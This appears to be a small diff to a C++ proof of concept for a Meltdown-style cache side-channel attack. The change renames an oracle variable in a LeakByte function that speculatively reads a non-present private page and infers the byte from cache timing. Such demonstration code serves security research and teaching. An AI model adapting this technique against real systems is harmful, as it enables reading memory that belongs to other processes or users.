@@ -53,7 +53,7 @@ char *private_page = nullptr;
  **/
 static char LeakByte(size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
@@ -69,8 +69,7 @@ static char LeakByte(size_t offset) {
       MemoryAndSpeculationBarrier();
 
       // Access the non-present private_page. That leads to a SEGFAULT.
-      ForceRead(isolated_oracle.data() +
-                static_cast<size_t>(private_page[offset]));
+      ForceRead(oracle.data() + static_cast<size_t>(private_page[offset]));
 
       std::cout << "Dead code. Must not be printed." << std::endl;
 
